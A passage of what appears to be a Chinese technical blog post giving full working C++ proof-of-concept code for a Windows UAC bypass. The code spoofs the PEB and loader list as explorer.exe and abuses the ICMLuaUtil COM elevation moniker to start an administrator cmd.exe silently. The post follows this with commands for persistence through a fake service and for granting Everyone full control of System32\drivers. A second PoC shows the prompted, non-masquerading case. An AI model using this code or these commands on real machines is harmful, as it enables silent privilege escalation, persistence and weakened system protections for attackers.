
```ruby
#include <windows.h>
#include <iostream>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ole32.lib")
// ---------------------------------------------------------
// 1. 重新定义完整的内部结构（跳过 winternl.h 的限制）
// ---------------------------------------------------------
typedef struct \_MY\_PEB\_LDR\_DATA {
ULONG Length;
BOOLEAN Initialized;
HANDLE SsHandle;
LIST\_ENTRY InLoadOrderModuleList; // 报错的那个成员就在这里
LIST\_ENTRY InMemoryOrderModuleList;
LIST\_ENTRY InInitializationOrderModuleList;
PVOID EntryInProgress;
BOOLEAN ShutdownInProgress;
HANDLE ShutdownThreadId;
} MY\_PEB\_LDR\_DATA, \* PMY\_PEB\_LDR\_DATA;
typedef struct \_MY\_LDR\_DATA\_TABLE\_ENTRY {
LIST\_ENTRY InLoadOrderLinks;
LIST\_ENTRY InMemoryOrderLinks;
LIST\_ENTRY InInitializationOrderLinks;
PVOID DllBase;
PVOID EntryPoint;
ULONG SizeOfImage;
UNICODE\_STRING FullDllName;
UNICODE\_STRING BaseDllName;
} MY\_LDR\_DATA\_TABLE\_ENTRY, \* PMY\_LDR\_DATA\_TABLE\_ENTRY;
// 自定义一个 PEB 结构，用来访问我们定义的 MY\_PEB\_LDR\_DATA
typedef struct \_MY\_PEB {
BOOLEAN InheritedAddressSpace;
BOOLEAN ReadImageFileExecOptions;
BOOLEAN BeingDebugged;
union {
BOOLEAN BitField;
struct {
BOOLEAN ImageUsesLargePages : 1;
BOOLEAN IsProtectedProcess : 1;
BOOLEAN IsImageDynamicallyRelocated : 1;
BOOLEAN SkipPatchingUser32Forwarders : 1;
BOOLEAN IsPackagedProcess : 1;
BOOLEAN IsAppContainer : 1;
BOOLEAN IsProtectedProcessLight : 1;
BOOLEAN IsLongPathAwareProcess : 1;
};
};
HANDLE Mutant;
PVOID ImageBaseAddress;
PMY\_PEB\_LDR\_DATA Ldr; // 使用我们自定义的 Ldr 结构
PRTL\_USER\_PROCESS\_PARAMETERS ProcessParameters;
} MY\_PEB, \* PMY\_PEB;
// ICMLuaUtil 接口
class \_\_declspec(uuid("6EDD6D74-C007-4E75-B76A-E5740995E24C")) ICMLuaUtil : public IUnknown {
public:
virtual HRESULT STDMETHODCALLTYPE Method1() = 0;
virtual HRESULT STDMETHODCALLTYPE Method2() = 0;
virtual HRESULT STDMETHODCALLTYPE Method3() = 0;
virtual HRESULT STDMETHODCALLTYPE Method4() = 0;
virtual HRESULT STDMETHODCALLTYPE Method5() = 0;
virtual HRESULT STDMETHODCALLTYPE Method6() = 0;
virtual HRESULT STDMETHODCALLTYPE ShellExec(LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, ULONG fMask, ULONG nShow) = 0;
};
// ---------------------------------------------------------
// 2. 改进后的伪装函数
// ---------------------------------------------------------
bool MasqueradePEB(LPCWSTR targetPath) {
wprintf(L"[\*] Masquerading PEB as: %s\n", targetPath);
#ifdef \_WIN64
PMY\_PEB pPEB = (PMY\_PEB)\_\_readgsqword(0x60);
#else
PMY\_PEB pPEB = (PMY\_PEB)\_\_readfsdword(0x30);
#endif
// 1. 分配持久内存存储路径字符串
size\_t pathLen = (wcslen(targetPath) + 1) \* sizeof(WCHAR);
PWSTR newPath = (PWSTR)LocalAlloc(LPTR, pathLen);
if (!newPath) return false;
wcscpy\_s(newPath, pathLen / sizeof(WCHAR), targetPath);
UNICODE\_STRING usPath;
RtlInitUnicodeString(&usPath, newPath);
// 2. 修改 ProcessParameters (ImagePathName)
pPEB->ProcessParameters->ImagePathName = usPath;
pPEB->ProcessParameters->CommandLine = usPath;
// 3. 修改 LDR 链表 (关键修复)
// 这里 pPEB->Ldr 现在指向的是我们自定义的 MY\_PEB\_LDR\_DATA
PLIST\_ENTRY pHead = &pPEB->Ldr->InLoadOrderModuleList;
PLIST\_ENTRY pCurrent = pHead->Flink;
// 获取第一个模块节点 (当前进程的模块)
PMY\_LDR\_DATA\_TABLE\_ENTRY pLdrEntry = (PMY\_LDR\_DATA\_TABLE\_ENTRY)pCurrent;
// 修改模块名
pLdrEntry->FullDllName = usPath;
PCWSTR fileName = wcsrchr(targetPath, L'\\');
if (fileName) {
fileName++;
UNICODE\_STRING usBaseName;
RtlInitUnicodeString(&usBaseName, fileName);
pLdrEntry->BaseDllName = usBaseName;
}
wprintf(L"[+] PEB and LDR successfuly patched.\n");
return true;
}
// ---------------------------------------------------------
// 3. COM 提升函数 (UAC Bypass)
// ---------------------------------------------------------
bool UACBypass(LPCWSTR payloadExe) {
HRESULT hr = E\_FAIL;
ICMLuaUtil\* pICMLuaUtil = nullptr;
LPCWSTR elevationMoniker = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
BIND\_OPTS3 bop;
memset(&bop, 0, sizeof(bop));
bop.cbStruct = sizeof(bop);
bop.dwClassContext = CLSCTX\_LOCAL\_SERVER;
wprintf(L"[\*] Calling CoGetObject...\n");
hr = CoGetObject(elevationMoniker, (BIND\_OPTS\*)&bop, \_\_uuidof(ICMLuaUtil), (void\*\*)&pICMLuaUtil);
if (FAILED(hr)) {
wprintf(L"[-] CoGetObject Failed: 0x%08X\n", hr);
return false;
}
wprintf(L"[+] Elevation success. Launching: %s\n", payloadExe);
hr = pICMLuaUtil->ShellExec(payloadExe, NULL, NULL, 0, SW\_SHOW);
if (pICMLuaUtil) pICMLuaUtil->Release();
return SUCCEEDED(hr);
}
int main() {
CoInitialize(NULL);
// 1. 伪装
if (MasqueradePEB(L"C:\\Windows\\explorer.exe")) {
// 2. 执行 UAC 绕过
if (!UACBypass(L"C:\\Windows\\System32\\cmd.exe")) {
wprintf(L"[-] Bypass failed.\n");
}
}
CoUninitialize();
system("pause");
return 0;
}
```

改变了 PEB 的 CommandLine

![](upload/attach/202603/944427\_PMY3SW5TRW53U9A.png)

也改变了 LDR (Loader) 模块链表

![](upload/attach/202603/944427\_HNEZCSR3RPHT8ZG.png)

![](upload/attach/202603/944427\_6BNV3DF2EJ89DP2.png)

cmd 进程被创建，窗口左上角显示 “管理员：C:\Windows\System32\cmd.exe”。没有弹出需要确认管理员权限的窗口。

![](upload/attach/202603/944427\_U99PGDAFHKPVDHU.png)

在组信息列表中，BUILTIN\Administrators 的属性是 “必需的组, 启用于默认, 启用的组, 组的所有者”

![](upload/attach/202603/944427\_K8PPFHKEUSGG7TA.png)

列表最后一行显示 High Mandatory Level (S-1-16-12288)，现在处于 High 级别，测试程序 ProcessFaker.exe 已经成功通过 ICMLuaUtil 接口，从 Medium 提升到了 High

在这个 cmd 窗口中，执行一些敏感操作都能成功

```ruby
sc create FakeService binPath= "C:\Windows\System32\cmd.exe" //创建临时的伪造服务，可用于持久化
//Windows 核心目录（如 System32\drivers）受 TrustedInstaller 保护，该文件夹的所有者 (Owner) 是 TrustedInstaller 账户，而不是管理员。
//利用当前的高权限，强制把文件夹的所有者改为当前管理员
takeown /f C:\Windows\System32\drivers
//然后可以修改权限了，给“所有人 (Everyone)”赋予对驱动文件夹的“完全控制 (F)”权限。
icacls C:\Windows\System32\drivers /grant Everyone:(F)
//查看刚创建的服务是否真的存在
sc query FakeService
```

![](upload/attach/202603/944427\_JM3V4R36792VRNX.png)

## 5.2 未进行伪装的提权

```ruby
#include <windows.h>
#include <iostream>
// 链接必要的库
#pragma comment(lib, "ole32.lib")
// 定义 ICMLuaUtil 接口
class \_\_declspec(uuid("6EDD6D74-C007-4E75-B76A-E5740995E24C")) ICMLuaUtil : public IUnknown {
public:
virtual HRESULT STDMETHODCALLTYPE Method1() = 0;
virtual HRESULT STDMETHODCALLTYPE Method2() = 0;
virtual HRESULT STDMETHODCALLTYPE Method3() = 0;
virtual HRESULT STDMETHODCALLTYPE Method4() = 0;
virtual HRESULT STDMETHODCALLTYPE Method5() = 0;
virtual HRESULT STDMETHODCALLTYPE Method6() = 0;
virtual HRESULT STDMETHODCALLTYPE ShellExec(LPCWSTR lpFile, LPCWSTR lpParameters, LPCWSTR lpDirectory, ULONG fMask, ULONG nShow) = 0;
};
int main() {
// 初始化 COM 库
CoInitialize(NULL);
wprintf(L"--- POC: Pure COM Elevation (No PEB Masquerading) ---\n");
wprintf(L"[\*] Current Process: ProcessFaker.exe (Real Identity)\n");
HRESULT hr = E\_FAIL;
ICMLuaUtil\* pICMLuaUtil = nullptr;
// 构造 Elevation Moniker
LPCWSTR elevationMoniker = L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}";
BIND\_OPTS3 bop;
memset(&bop, 0, sizeof(bop));
bop.cbStruct = sizeof(bop);
bop.dwClassContext = CLSCTX\_LOCAL\_SERVER;
wprintf(L"[\*] Requesting Admin privilege via COM...\n");
// 注意：这次我们没有修改 PEB，系统知道是谁在发起请求
hr = CoGetObject(elevationMoniker, (BIND\_OPTS\*)&bop, \_\_uuidof(ICMLuaUtil), (void\*\*)&pICMLuaUtil);
if (SUCCEEDED(hr) && pICMLuaUtil) {
wprintf(L"[+] Successfully obtained interface!\n");
// 尝试启动 CMD
pICMLuaUtil->ShellExec(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, SEE\_MASK\_DEFAULT, SW\_SHOW);
pICMLuaUtil->Release();
}
else {
// 如果用户在弹窗中点了“否”，或者直接被拦截，会走到这里
wprintf(L"[-] CoGetObject Failed: 0x%08x\n", hr);
}
CoUninitialize();
system("pause");
return 0;
}
```

此时会弹出 UAC 警告窗口

![](upload/attach/202603/944427\_RT4MMSSNCTZQPP8.png)

如果攻击者采用这种手法，那肯定会引起检测工具或者安全分析师的警觉，因为这看起来是一个陌生的程序在申请更高权限，十分异常。

![](upload/attach/202603/944427\_35XWF5XHBNADAGC.png)

# 参考链接

<a href="elink@664K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2$3k6i4u0Y4K9h3I4A6N6i4y4H3M7X3!0B7k6h3y4@1i4K6u0W2j5$3!0E0i4K6u0r3K9$3g2J5L8X3g2D9M7#2)9J5c8Y4R3$3y4q4)9J5c8Y4N6A6L8X3c8G2N6%4y4Q4x3X3b7I4x3g2)9J5c8U0t1@1K9o6u0Q4x3V1k6Q4y4h3k6b7c8f1t1$3y4l9`.`.">Vergilius Project</a>

# 1. 引言
